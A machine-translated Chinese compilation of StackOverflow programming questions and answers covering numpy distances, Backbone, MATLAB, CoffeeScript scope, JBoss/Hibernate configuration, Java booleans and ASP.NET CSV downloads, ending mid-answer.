# StackOverflow 问答 13806000-13806999

# numpy - 使用 numpy 或 scipy 计算两组向量之间欧几里得距离的最快方法

> ID：13806003
> 
> 赞同：5
> 
> 时间：2012-12-10T17:28:24.263
> 
> 标签：numpy, scipy, python-2.x, euclidean-distance

好的，我最近发现该`scipy.spatial.distance.cdist`命令可以非常快速地解决源和目标的两个向量数组之间的完整距离矩阵。请参阅：[如何用 numpy 计算欧几里得距离？](https://stackoverflow.com/questions/1401712/calculate-euclidean-distance-with-numpy) 在解决两个相等大小的数组之间的距离时，我想尝试复制这些性能提升。两个 SINGLE 向量之间的距离很容易计算，如上一个链接所示。我们可以取向量：

```
 import numpy as np
    A=np.random.normal(size=(3))
    B=np.random.normal(size=(3)) 
```

然后在哪里使用“numpy.linalg.norm”

```
 np.linalg.norm(A-B) 
```

相当于

```
 temp = A-B
    np.sqrt(temp[0]**2+temp[1]**2+temp[2]**2) 
```

但是，当我想知道第二个解决方案完美运行的两组向量之间的距离时，`my_distance = distance_between( A[i], B[i] ) for all i`效果很好。正如预期的那样：

```
 A=np.random.normal(size=(3,42))
    B=np.random.normal(size=(3,42))     
    temp = A-B
    np.sqrt(temp[0]**2+temp[1]**2+temp[2]**2) 
```

给我一组 42 个距离的`i`th 元素`A`到`i`th 元素之间的距离`B`。而该`norm`函数正确地计算了整个矩阵的范数，给了我一个不是我想要的值。42 距离的行为是我想要保持的，希望它的速度几乎与我`cdist`解决完整矩阵的速度一样快。所以问题是使用 python 和 numpy/scipy 计算`i`具有 shape 的数据之间的距离的最有效方法是什么`(n,i)`？

谢谢，斯隆

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T18:06:42.987

我想你已经自己破了大部分案子。但是，我将使用以下命令代替您的最后一行：

```
np.sqrt(np.sum(temp**2,0)) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-04-03T19:18:47.383

以下是我认为最合适的两种方法的定时比较：

```
import timeit
In[19]:    timeit.timeit(stmt='np.linalg.norm(x-y,axis=0)', setup='import numpy as np; x,y = np.random.normal(size=(10, 100)), np.random.normal(size=(10, 100))', number=1000000)
Out[19]:   15.132534857024439

In[20]:    timeit.timeit(stmt='np.sqrt(np.sum((x-y),axis=1))', setup='import numpy as np; x,y = np.random.normal(size=(10, 100)), np.random.normal(size=(10, 100))', number=1000000)
Out[20]:   9.417887529009022 
```

我并不惊讶 numpy 方法工作得更快。我相信随着python的改进，很多这些内置函数都会得到改进。

在 anaconda python 版本 3.5.2 上进行了测试

# backbone.js - 如何使用 Backbone 获取单个模型？

> ID：13806004
> 
> 赞同：0
> 
> 时间：2012-12-10T17:28:27.690
> 
> 标签：backbone.js

在 Backbone 上下文中，我想在没有集合的情况下在 JSON 中获取一些“元”数据：

```
/data/meta.json 
{
  "name": "Patrick Mulder",
  "title": "SW Developer"
} 
```

如何将其提取到模型中，以便我可以这样做：

```
var meta = new MetaItem();
meta.fetch()
console.log(meta.name)  // <- or console.log(meta.get('name') ? 
```

通过我的尝试：

```
 var MetaItem = Backbone.Model.extend({
      urlRoot : '/data/meta.json',
      parse: function(response) {
          console.log(response);
          return response;
      }
    }); 
```

对于任何属性，我都得到“未定义”……有人知道为什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:11:48.360

模型属性通过以下方式读取：

meta.get('名字')

不与 meta.name

# matlab - 每次都留下一个索引

> ID：13806009
> 
> 赞同：2
> 
> 时间：2012-12-10T17:28:49.710
> 
> 标签：matlab

我正在尝试编写一个程序来计算调用`P`一组数字 ( `i=1:10`) 的变量，除了一个数字 ( `ind`)，每次都选择它。

第一次`P`是为计算的`i=1:10`，例如数字 4 被选为`ind`并使用，我们不希望它包含在下一次迭代中。因此`P`，必须计算下一次迭代`i=[1:3 5:10]`。

我该如何处理？到目前为止，我所拥有的是：

```
for i=1:10

    i=1:i
        t = sum(Job(i,2))
    i=1:10
        P = mean(Job(i,2))
        Index= Job(i,4)/Job(i,2)*exp(-max(Job(i,1)-Job(i,2)-t,0)/2*P)
        X=max(Index)
        ind=find(Index >= X)
    completion_time(Job(ind,3))= machine_free_time + Job(ind,2)
    machine_free_time = completion_time(Job(ind,3))
    Lateness(Job(ind,3))= completion_time(Job(ind,3)) - Job(ind,1)
    Tardiness(Job(ind,3))= max(Lateness(Job(ind,3)),0)
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T17:44:37.937

这样做的两种方法：

1.  从向量中删除元素

    ```
    idcs = 1:10; % initially all values are included from 1 to 10
    for ii=1:10
        idx = choose one out of idcs
        % do your calculation
        % remove idx from idcs
        idcs(idcs==idx)=[];
    end 
    ```

2.  使用第二个向量来保存已使用的值：

    ```
    idcs = 1:10;
    valused=false(size(idcs));
    for ii=1:10
        idx = choose one out of idcs(~valused)
        % do your calculation
        % set the used value to true
        valused(idcs=idx)=true;
    end 
    ```

因此，例如，将第二种方法用于您正在尝试做的事情，我认为它会像这样：

```
vector_i = 1:10
vector_i_used = false(size(vector_i));

for kk=1:10 % main loop
    P = calculateP( vector_i(~vector_i_used) );
    % ...
    ind = calculateInd(P, vector_i(~vector_i_used));
    vector_i_used(vector_i==ind) = true;
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T17:54:28.963

只需使用 if/then 语句跳过循环中所需的索引：

```
 skipThisIndex = [];
   for ii=1:10
      if ii~=skipThisIndex
         %  Do calculations
      end
      %Determine which index you want to skip next
      skipThisIndex = indexToSkipNext;
   end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T17:43:46.220

我建议采用不同的方法。检查该值是否已包含在内，如果您已经测试过，则不要包含它。我将把代码和计算留给`newDone`你，但这种方法应该可行。

```
alreadyDone=false(10,1);
for i=1:10
   if (alreadyDone(i))
      %Do stuff here
   end
   alreadyDone(newDone)=true;
end 
```

# javascript - 咖啡范围误解

> ID：13806010
> 
> 赞同：4
> 
> 时间：2012-12-10T17:28:52.003
> 
> 标签：javascript, coffeescript

我正在尝试理解咖啡脚本中的变量范围并且有点困惑，这是一个例子：

**咖啡脚本代码：**

```
 x = "localscope"
  z = () -> 
    x = "functionscope"
    console.log(x)

  console.log(x) 
```

**Javascript编译结果：**

```
(function() {
  var x, z;

  x = "localscope";

  z = function() {
    x = "functionscope";
    return console.log(x);
  };

  console.log(x);

}).call(this); 
```

正如我在纯 javascript 中所知道的那样，包含在函数中的所有变量都在同一范围内起作用。所以据我了解，所有用咖啡脚本编写的变量都是全局的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T17:37:09.287

要在咖啡脚本中隐藏变量，您需要执行以下操作：

```
x = "localscope"
z = ((x) -> () -> 
    x = "functionscope"
    console.log(x)
)(x)
console.log(x) 
```

生成的 javascript 是：

```
var x, z;

x = "localscope";

z = (function(x) {
  return function() {
    x = "functionscope";
    return console.log(x);
  };
})(x);

console.log(x); 
```

在您的示例中， the`x`不是最内部函数的本地函数，而是指`x`您在开始时声明的相同“全局”。通过“全局”，我的意思是在同一个文件中的任何地方都可以访问。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-04T00:18:07.450

您似乎对 CoffeeScript 如何处理本地范围感到困惑。

定义变量时，CoffeeScript 将其变量定义提升到定义变量的范围的顶部。因此，

```
x = 'localscope'
z = ->
  x = 'functionscope' 
```

完全按照您的描述进行解析

```
var x, z;
x = 'globalscope';
z = function () {
  x = 'localscope';
}; 
```

编译整个文件后，CoffeeScript 会将您编写的所有代码包装到一个匿名函数中，这样即使您的最高范围变量也不会渗入全局命名空间。这就是`(function () { ... }).call(this)`您在代码的 JavaScript 版本的顶部和底部看到的。

如果你习惯用 Ruby 编写，你的期望是

```
> x = 5
> def z
>   x = 7
>   puts x
> end
> z # logs '7'
> x # still 5 
```

Ruby 自动在本地定义每个变量声明的范围，除非该变量另有定义（例如，作为实例变量或全局变量）。

另一方面，JavaScript 会在看到`var`前缀时对变量进行作用域。

```
var x = 5;
function z () {
  var x = 7;
  console.log(x);
};
z(); // logs '7'
x; // still 5 
```

CoffeeScript 假定您可能希望变量从较高范围渗透到​​较低范围，并且除了全局变量（可以在`window`对象上设置）之外，没有办法设置范围排序的类似“实例变量”的变量 -的本地。

正如@Esailija 指出的那样（尽管该解决方案的实现并不十分完美），您可以通过将 x 作为参数传入 x 来确保 x 在本地范围内限定于 z 函数，因为 JavaScript 会自动将参数仅在本地范围内限定为接受它们的函数：

```
var x = 5;
function z (x) {
  x = 7;
  console.log(x);
};
z(); // logs '7' -- in JS, it's OK to execute a function without a named argument, which defaults to undefined
x; // still 5 
```

或在 CoffeeScript 中：

```
x = 5
z = (x) ->
  x = 7
  console.log x
z()
console.log x 
```

作为旁注，@Esailija 的解决方案使用`do`调用更惯用地编写：

```
x = "localscope"
z = do (x) -> () ->
  x = "functionscope"
  console.log(x)
console.log(x) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-02T09:51:12.883

Javascript 有一个全局范围作为默认范围。CoffeeScript 通常将匿名函数调用的“每个文件的范围”作为默认范围。这可以防止 CoffeeScript 中脚本文件之间的变量冲突。

我假设您想创建一个全局变量，不是吗？为此，您需要将变量附加到“根对象”。对于浏览器脚本，它将是*窗口*对象。所以你只需要：

```
window.x = 'globalscope' 
```

...并做了。

如果相反，则在函数级别进行变量隔离。它将照此创建，但您需要使用不同的名称。请检查来自[coffeescript.org](http://coffeescript.org)的示例（文本搜索“范围”）：

咖啡脚本

```
outer = 1
changeNumbers = ->
  inner = -1
  outer = 10
inner = changeNumbers() 
```

编译成 JavaScript

```
var changeNumbers, inner, outer;

outer = 1;

changeNumbers = function() {
  var inner;
  inner = -1;
  return outer = 10;
};

inner = changeNumbers(); 
```

# eclipse - ejb 3.1 & jsf & jboss 7.1 & 日食靛蓝

> ID：13806011
> 
> 赞同：0
> 
> 时间：2012-12-10T17:28:53.350
> 
> 标签：eclipse, hibernate, jsf-2, jboss7.x, ejb-3.1

我已经开始使用 Eclipse Indigo+JBoss 7.1+MySQL。我是 Java EE 的初学者程序员。所以，我对教程有疑问：[http](http://www.youtube.com/watch?v=z55reyPqH44) ://www.youtube.com/watch?v=z55reyPqH44 。（这是如何使用 MySql 数据库的简单示例）。

所以，这个项目使用：EJB 3.1 JSF 2.0 JBOSS AS 7.1 MySQL，当我在控制台中运行这个或类似的项目时，“休眠”有很多问题。

安慰：

```
15:12:46,808 WARN [org.hibernate.service.jdbc.connections.internal.ConnectionProviderInitiator] (MSC service thread 1-3) HHH000181: No appropriate connection provider encountered, assuming application will be supplying connections 
15:12:46,914 ERROR [org.jboss.msc.service.fail] (MSC service thread 1-3) MSC00001: Failed to start service jboss.persistenceunit."TestLogowanie.war#TestLogowanie": 
org.jboss.msc.service.StartException in service jboss.persistenceunit."TestLogowanie.war#TestLogowanie": Failed to start service 
    at org.jboss.msc.service.ServiceControllerImpl$StartTask.run(ServiceControllerImpl.java:1767) [jboss-msc-1.0.2.GA.jar:1.0.2.GA] 
    at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source) [rt.jar:1.7.0_01] 
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source) [rt.jar:1.7.0_01] 
    at java.lang.Thread.run(Unknown Source) [rt.jar:1.7.0_01] 

Caused by: javax.persistence.PersistenceException: [PersistenceUnit: TestLogowanie] Unable to build EntityManagerFactory 
    at org.hibernate.ejb.Ejb3Configuration.buildEntityManagerFactory(Ejb3Configuration.java:914) 
    at org.hibernate.ejb.Ejb3Configuration.buildEntityManagerFactory(Ejb3Configuration.java:889) 
    at org.hibernate.ejb.HibernatePersistence.createContainerEntityManagerFactory(HibernatePersistence.java:73) 
    at org.jboss.as.jpa.service.PersistenceUnitServiceImpl.createContainerEntityManagerFactory(PersistenceUnitServiceImpl.java:162) 
    at org.jboss.as.jpa.service.PersistenceUnitServiceImpl.start(PersistenceUnitServiceImpl.java:85) 
    at org.jboss.msc.service.ServiceControllerImpl$StartTask.startService(ServiceControllerImpl.java:1811) [jboss-msc-1.0.2.GA.jar:1.0.2.GA] 
    at org.jboss.msc.service.ServiceControllerImpl$StartTask.run(ServiceControllerImpl.java:1746) [jboss-msc-1.0.2.GA.jar:1.0.2.GA] 
    ... 3 more 
Caused by: org.hibernate.HibernateException: Connection cannot be null when 'hibernate.dialect' not set 
    at org.hibernate.service.jdbc.dialect.internal.DialectFactoryImpl.determineDialect(DialectFactoryImpl.java:97) 
    at org.hibernate.service.jdbc.dialect.internal.DialectFactoryImpl.buildDialect(DialectFactoryImpl.java:67) 
    at org.hibernate.engine.jdbc.internal.JdbcServicesImpl.configure(JdbcServicesImpl.java:176) 
    at org.hibernate.service.internal.StandardServiceRegistryImpl.configureService(StandardServiceRegistryImpl.java:75) 
    at org.hibernate.service.internal.AbstractServiceRegistryImpl.initializeService(AbstractServiceRegistryImpl.java:159) 
    at org.hibernate.service.internal.AbstractServiceRegistryImpl.getService(AbstractServiceRegistryImpl.java:131) 
    at org.hibernate.cfg.SettingsFactory.buildSettings(SettingsFactory.java:71) 
    at org.hibernate.cfg.Configuration.buildSettingsInternal(Configuration.java:2270) 
    at org.hibernate.cfg.Configuration.buildSettings(Configuration.java:2266) 
    at org.hibernate.cfg.Configuration.buildSessionFactory(Configuration.java:1735) 
    at org.hibernate.ejb.EntityManagerFactoryImpl.(EntityManagerFactoryImpl.java:84) 
    at org.hibernate.ejb.Ejb3Configuration.buildEntityManagerFactory(Ejb3Configuration.java:904) 
    ... 9 more

15:12:47,142 INFO [org.jboss.as.server] (DeploymentScanner-threads - 2) JBAS015870: Deploy of deployment "TestLogowanie.war" was rolled back with failure message {"JBAS014671: Failed services" => {"jboss.persistenceunit.\"TestLogowanie.war#TestLogowanie\"" => "org.jboss.msc.service.StartException in service jboss.persistenceunit.\"TestLogowanie.war#TestLogowanie\": Failed to start service"}} 
15:12:47,191 INFO [org.jboss.as.server.deployment] (MSC service thread 1-4) JBAS015877: Stopped deployment TestLogowanie.war in 49ms 
15:12:47,193 INFO [org.jboss.as.controller] (DeploymentScanner-threads - 2) JBAS014774: Service status report JBAS014777: Services which failed to start: service jboss.persistenceunit."TestLogowanie.war#TestLogowanie": org.jboss.msc.service.StartException in service jboss.persistenceunit."TestLogowanie.war#TestLogowanie": Failed to start service
15:12:47,196 ERROR [org.jboss.as.server.deployment.scanner] (DeploymentScanner-threads - 1) {"JBAS014653: Composite operation failed and was rolled back. Steps that failed:" => {"Operation step-2" => {"JBAS014671: Failed services" => {"jboss.persistenceunit.\"TestLogowanie.war#TestLogowanie\"" => "org.jboss.msc.service.StartException in service jboss.persistenceunit.\"TestLogowanie.war#TestLogowanie\": Failed to start service"}}}} 
```

* * *

哦，对不起，当我今天重新启动计算机时，看起来问题丢失了。我的意思是控制台中的错误。但每次我有“HTTP 状态 404”。看看我的控制台和屏幕。我不知道为什么每次 JBoss 从我的旧项目（CountryWebService）中启动站点被删除。我想启动'SiteMYSQL'。我还有另一个问题。当我删除我的 JBoss 7.1 服务器并启动新的 Tomcat 7 时，我的端口 8080 每次都被 JBoss 站点忙碌。我必须更改 Tomcat 的端口，例如 8081。

安慰：

```
 10:55:37,826 INFO  [org.jboss.modules] JBoss Modules version 1.1.1.GA
10:55:38,216 INFO  [org.jboss.msc] JBoss MSC version 1.0.2.GA
10:55:38,277 INFO  [org.jboss.as] JBAS015899: JBoss AS 7.1.0.Final "Thunder" starting
10:55:39,747 INFO  [org.xnio] XNIO Version 3.0.3.GA
10:55:39,760 INFO  [org.xnio.nio] XNIO NIO Implementation Version 3.0.3.GA
10:55:39,770 INFO  [org.jboss.remoting] JBoss Remoting version 3.2.2.GA
10:55:39,780 INFO  [org.jboss.as.server] JBAS015888: Creating http management service using socket-binding (management-http)
10:55:39,901 INFO  [org.jboss.as.logging] JBAS011502: Removing bootstrap log handlers
10:55:39,907 INFO  [org.jboss.as.configadmin] (ServerService Thread Pool -- 26) JBAS016200: Activating ConfigAdmin Subsystem
10:55:39,994 INFO  [org.jboss.as.clustering.infinispan] (ServerService Thread Pool -- 31) JBAS010280: Activating Infinispan subsystem.
10:55:40,026 INFO  [org.jboss.as.connector] (MSC service thread 1-2) JBAS010408: Starting JCA Subsystem (JBoss IronJacamar 1.0.7.Final)
10:55:40,038 INFO  [org.jboss.as.naming] (ServerService Thread Pool -- 38) JBAS011800: Activating Naming Subsystem
10:55:40,048 INFO  [org.jboss.as.security] (ServerService Thread Pool -- 44) JBAS013101: Activating Security Subsystem
10:55:40,054 INFO  [org.jboss.as.osgi] (ServerService Thread Pool -- 39) JBAS011940: Activating OSGi Subsystem
10:55:40,073 INFO  [org.jboss.as.connector.subsystems.datasources] (ServerService Thread Pool -- 27) JBAS010403: Deploying JDBC-compliant driver class org.h2.Driver (version 1.3)
10:55:40,074 INFO  [org.jboss.as.webservices] (ServerService Thread Pool -- 48) JBAS015537: Activating WebServices Extension
10:55:40,134 INFO  [org.jboss.as.connector.subsystems.datasources] (ServerService Thread Pool -- 27) JBAS010404: Deploying non-JDBC-compliant driver class com.mysql.jdbc.Driver (version 5.1)
10:55:40,373 INFO  [org.jboss.as.naming] (MSC service thread 1-3) JBAS011802: Starting Naming Service
10:55:40,379 INFO  [org.jboss.as.security] (MSC service thread 1-3) JBAS013100: Current PicketBox version=4.0.6.final
10:55:40,595 INFO  [org.jboss.ws.common.management.AbstractServerConfig] (MSC service thread 1-2) JBoss Web Services - Stack CXF Server 4.0.1.GA
10:55:40,706 INFO  [org.jboss.as.mail.extension] (MSC service thread 1-2) JBAS015400: Bound mail session [java:jboss/mail/Default]
10:55:40,955 INFO  [org.jboss.as.server.deployment.scanner] (MSC service thread 1-3) JBAS015012: Started FileSystemDeploymentService for directory C:\Users\Andrew\Desktop\Wojtek\Studia\sem7\jboss-as-7.1.0.Final\jboss-as-7.1.0.Final\standalone\deployments
10:55:40,974 INFO  [org.jboss.as.server.deployment.scanner] (DeploymentScanner-threads - 1) JBAS015003: Found SiteMYSQL.war in deployment directory. To trigger deployment create a file called SiteMYSQL.war.dodeploy
10:55:41,157 INFO  [org.jboss.as.remoting] (MSC service thread 1-1) JBAS017100: Listening on localhost/127.0.0.1:4447
10:55:41,220 INFO  [org.apache.coyote.http11.Http11Protocol] (MSC service thread 1-1) Starting Coyote HTTP/1.1 on http-localhost-127.0.0.1-8080
10:55:41,350 INFO  [org.jboss.as.connector.subsystems.datasources] (MSC service thread 1-3) JBAS010400: Bound data source [java:/Client]
10:55:41,351 INFO  [org.jboss.as.connector.subsystems.datasources] (MSC service thread 1-2) JBAS010400: Bound data source [java:jboss/datasources/ExampleDS]
10:55:41,415 INFO  [org.jboss.as.remoting] (MSC service thread 1-1) JBAS017100: Listening on /127.0.0.1:9999
10:55:41,597 INFO  [org.jboss.as.server.deployment] (MSC service thread 1-1) JBAS015876: Starting deployment of "SiteMYSQL.war"
10:55:41,765 INFO  [org.jboss.as.jpa] (MSC service thread 1-1) JBAS011401: Read persistence.xml for SiteMYSQL
10:55:42,402 INFO  [org.jboss.as.jpa] (MSC service thread 1-3) JBAS011402: Starting Persistence Unit Service 'SiteMYSQL.war#SiteMYSQL'
10:55:42,619 INFO  [org.hibernate.annotations.common.Version] (MSC service thread 1-3) HCANN000001: Hibernate Commons Annotations {4.0.1.Final}
10:55:42,629 INFO  [org.hibernate.Version] (MSC service thread 1-3) HHH000412: Hibernate Core {4.0.1.Final}
10:55:42,650 INFO  [org.hibernate.cfg.Environment] (MSC service thread 1-3) HHH000206: hibernate.properties not found
10:55:42,657 INFO  [org.hibernate.cfg.Environment] (MSC service thread 1-3) HHH000021: Bytecode provider name : javassist
10:55:42,678 INFO  [org.hibernate.ejb.Ejb3Configuration] (MSC service thread 1-3) HHH000204: Processing PersistenceUnitInfo [
    name: SiteMYSQL
    ...]
10:55:42,923 INFO  [org.hibernate.service.jdbc.connections.internal.ConnectionProviderInitiator] (MSC service thread 1-3) HHH000130: Instantiating explicit connection provider: org.hibernate.ejb.connection.InjectedDataSourceConnectionProvider
10:55:43,208 INFO  [org.hibernate.dialect.Dialect] (MSC service thread 1-3) HHH000400: Using dialect: org.hibernate.dialect.MySQLDialect
10:55:43,230 INFO  [org.hibernate.engine.transaction.internal.TransactionFactoryInitiator] (MSC service thread 1-3) HHH000268: Transaction strategy: org.hibernate.engine.transaction.internal.jta.CMTTransactionFactory
10:55:43,236 INFO  [org.hibernate.hql.internal.ast.ASTQueryTranslatorFactory] (MSC service thread 1-3) HHH000397: Using ASTQueryTranslatorFactory
10:55:43,281 INFO  [org.hibernate.validator.util.Version] (MSC service thread 1-3) Hibernate Validator 4.2.0.Final
10:55:43,694 INFO  [javax.enterprise.resource.webcontainer.jsf.config] (MSC service thread 1-3) Initializing Mojarra 2.1.5 (SNAPSHOT 20111202) for context '/SiteMYSQL'
10:55:46,140 INFO  [org.jboss.web] (MSC service thread 1-3) JBAS018210: Registering web context: /SiteMYSQL
10:55:46,147 INFO  [org.jboss.as] (MSC service thread 1-1) JBAS015874: JBoss AS 7.1.0.Final "Thunder" started in 8818ms - Started 179 of 253 services (72 services are passive or on-demand)
10:55:46,258 INFO  [org.jboss.as.server] (DeploymentScanner-threads - 2) JBAS018559: Deployed "SiteMYSQL.war" 
```

屏幕：

[http://imgur.com/Peja7](http://imgur.com/Peja7)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:46:55.863

在您的`persistence.xml`中，您有：

```
 <jta-data-source>jdbc:mysql://localhost:3306/Client</jta-data-source> 
```

那是错误的。这不应该是一个 JDBC URL，它应该是一个标识 JBoss 提供的数据源的 JNDI URL。

在我的一个（工作！）项目中，我有这个`persistence.xml`：

```
 <jta-data-source>jdbc/catalogueDS</jta-data-source> 
```

这在`standalone.xml`：

```
<subsystem xmlns="urn:jboss:domain:datasources:1.0">
    <datasources>
        <datasource jndi-name="java:/jdbc/catalogueDS" pool-name="catalogueDS" enabled="true" use-java-context="true">
            <connection-url>jdbc:h2:data/catalogueDS</connection-url>
            <driver>h2</driver>
            <security>
                <user-name />
                <password />
            </security>
            <statement>
                <track-statements>TRUE</track-statements>
            </statement>
        </datasource>

        <drivers>
            <driver name="h2" module="com.h2database.h2">
                <xa-datasource-class>org.h2.jdbcx.JdbcDataSource
                </xa-datasource-class>
            </driver>
        </drivers>
    </datasources>
</subsystem> 
```

如您所见，`jta-data-source`in`persistence.xml`与`jndi-name`in匹配`standalone.xml`。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-02-12T10:11:37.247

Persistence.xml 应该放在战争的根文件夹 META-INF 中（对不起我的英文）

# facebook - Magento Store URLS 不使用在 FB 中显示的信息

> ID：13806013
> 
> 赞同：0
> 
> 时间：2012-12-10T17:29:03.957
> 
> 标签：facebook, magento, facebook-like, magento-1.7

我开发了一个在线商店，创建了一个 FB 应用程序，并与一个社交分享模块集成。正如您在此页面中看到的那样（[http://www.citromen.com/en/c/c3-ii/traavagem/discos-de-trav-o-frente-ebc-ultimate-sloted-rotor.html](http://www.citromen.com/en/c/c3-ii/travagem/discos-de-trav-o-frente-ebc-ultimate-sloted-rotor.html)）我' ve html 标记中的 xml 命名空间，head 中的 og:xpto 标记...我尝试分享，不要显示标题、描述或图像。

我错过了什么？:(

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T17:54:05.590

一种可能的原因是结果被 facebook 缓存。

您是否尝试使用[https://developers.facebook.com/tools/debug清除 facebook 缓存](https://developers.facebook.com/tools/debug)

另请参阅[Facebook 对象调试器：无法从 URL 检索数据。(200)](https://stackoverflow.com/questions/10786209/facebook-object-debugger-could-not-retrieve-data-from-url-200)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:35:17.607

在 FB Open Graph 页面[https://developers.facebook.com/docs/opengraphprotocol/](https://developers.facebook.com/docs/opengraphprotocol/)中，他们在 html 标记中打开了一些 xml 命名空间和 facebook。我在我的页面中有那个并且不工作......

在@RS 建议的测试中，我删除了这两个命名空间......开始工作......

谢谢指导...

# sql - 使用另一个表中的按列分组选择最大值

> ID：13806015
> 
> 赞同：0
> 
> 时间：2012-12-10T17:29:03.773
> 
> 标签：sql, join, group-by, grouping, max

给定下表：

```
tableA(v1,v2)
tableB(v3,v4)
tableC(v5,v6) 
```

我想编写如下查询：

```
SELECT MAX(v1)
FROM tableA
WHERE v2 IN (SELECT v3
             FROM tableB
             WHERE v4 IN (SELECT v5
                          FROM tableC
                         )
             )
GROUP BY v6 
```

只有使用 IN 才能实现这样的事情吗？我知道如何通过在我的三个表之间使用 JOIN 来编写它，但我不想使用 JOIN。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:34:08.447

`JOIN`不，不使用（至少在 MS-SQL 中）是不可能做到这一点的。

> GROUP BY 子句中的表达式可以包含 FROM 子句中的表、派生表或视图的列。这些列不需要出现在 SELECT 子句列表中。

[http://msdn.microsoft.com/en-us/library/ms177673.aspx](http://msdn.microsoft.com/en-us/library/ms177673.aspx)

# java - 检查“int”类型的“布尔”结果

> ID：13806021
> 
> 赞同：33
> 
> 时间：2012-12-10T17:29:28.530
> 
> 标签：java, boolean, int, logical-operators

我正在学习 Java，来自 C，我发现具有`boolean`类型的语言之间存在有趣的差异。在 C 中没有`bool`/`ean`所以我们需要使用数字类型来表示布尔逻辑 ( `0 == false`)。

我猜在Java中不起作用：

```
int i = 1;
if (i)
    System.out.println("i is true"); 
```

也不会通过类型转换更改条件：

```
if ((boolean)i) 
```

所以除了做类似的事情：

```
if ( i != 0 ) 
```

还有其他方法可以对`int`类型进行 C-ish 逻辑检查吗？只是想知道是否有任何 Java 技巧允许对像这样的非布尔类型进行布尔逻辑。

* * *

**编辑：**
上面的例子非常简单，并且产生了狭窄的思维范围。当我最初问这个问题时，我也在考虑函数调用的非布尔返回。例如 Linux`fork()`调用。它本身不返回`int`，但我可以很好地使用数字返回值作为条件，如下所示：

```
if( fork() ) {
    // do child code 
```

这允许我处理子条件中的代码，而不是为父处理（或在错误返回结果为负的情况下）。

所以我目前对 Java 的了解还不够，无法给出一个好的“Java”示例，但那是我的初衷。

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2012-12-10T17:31:34.987

在 Java 中，

```
if ( i != 0 ) 
```

是检查整数是否`i`不同于的惯用方法`zero`。

如果`i`用作标志，它应该是 type`boolean`而不是 type `int`。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-10T17:32:48.983

为什么不使用`boolean`类型？这将按您的预期工作，而不会出现潜在的问题整数/布尔合并。

```
private boolean isValid;
...
if (!isValid) {
   ...
} 
```

请注意，这是惯用的 Java 方法。3rd 方库使用它，您的 API 的消费者也会使用并期望它。我希望你用来给你的库，`booleans`因此它只是你把它`ints`当作`booleans`.

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2016-10-05T16:00:37.743

试试Apache [common-lang中的](http://commons.apache.org/proper/commons-lang/)[BooleanUtils](https://commons.apache.org/proper/commons-lang/javadocs/api-3.1/org/apache/commons/lang3/BooleanUtils.html#toBooleanObject(int))。

```
 BooleanUtils.toBoolean(0) = Boolean.FALSE
  BooleanUtils.toBoolean(1) = Boolean.TRUE
  BooleanUtils.toBoolean(2) = Boolean.TRUE 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-12-10T17:33:15.357

来自[**JLS**](http://docs.oracle.com/javase/specs/jls/se7/jls7.pdf)：

> **boolean 类型有两个值，由布尔文字 true 和 false 表示，由 ASCII 字母组成。**

因此，答案是“否”。唯一的就是

```
if ( i != 0 ) 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-12-10T17:33:43.110

在java中，条件必须是布尔类型，否则它不能是表达式，这就是为什么

```
if( i ) 
```

不允许。

它必须是真或假。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-10T17:33:12.967

你可以尝试类似的东西。布尔 i = 真；if (i) System.out.println("i is true");

只需将其初始化为布尔值而不是整数。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-10T17:39:36.163

如果你坚持使用**int**而不是boolean，就用一个方法来转换

```
class BooleanHelper
{
   public static boolean toBoolean (int pVal) {
      return pVal != 0;
   }
 ...
}

// apply

if (BooleanHelper.toBoolean(i)) { // BooleanHelper could be avoided using static imports... 
```

但是，只需使用

```
if (i != 0) { 
```

还是更短更清晰。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2018-05-30T07:25:23.503

大概是这样的：

`int i == 0 ? false : true;`

或者反过来：

`int i == 1 ? true : false`

...

# c# - 下载可能需要很长时间才能请求的文件

> ID：13806023
> 
> 赞同：0
> 
> 时间：2012-12-10T17:29:42.617
> 
> 标签：c#, asp.net, http

我有一个应用程序可以生成 50,000 条包含某些信息的记录。生成并保存到数据库后，用户可以随时从控制面板将记录下载为 csv。

我遇到的问题是生成 CSV 最多可能需要 40 多秒。但是当它完成处理时，浏览器不再尝试下载它。相反，它只是挂起。

我目前设置了一个高超时值，因此处理不会超时。我还需要动态生成它，因为它需要包含相关的实时数据。

有谁知道为什么等待文件生成后它不下载？

这是我生成后响应的标题：

```
//**generate the csv as string here, and then...**
Response.Clear();
Response.AddHeader("content-disposition", string.Format("attachment;filename=file_{0}.csv", batchId));
Response.ContentType = "text/csv";
Response.Write(csv);
Response.End(); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T17:47:10.213

不要预先生成整个 csv 文件。当您从数据库中检索记录时，将记录写入流。你想要看起来像这样的代码：

```
Response.Clear();
Response.AddHeader("content-disposition", string.Format("attachment;filename=file_{0}.csv", batchId));
Response.ContentType = "text/csv";

using (SqlDataReader rdr= GetDataForCSV())
{
    int i = 0;
    while (rdr.Read())
    {
       Response.Write(CSVFromIDataRecord(rdr));
       Response.Write("\n");
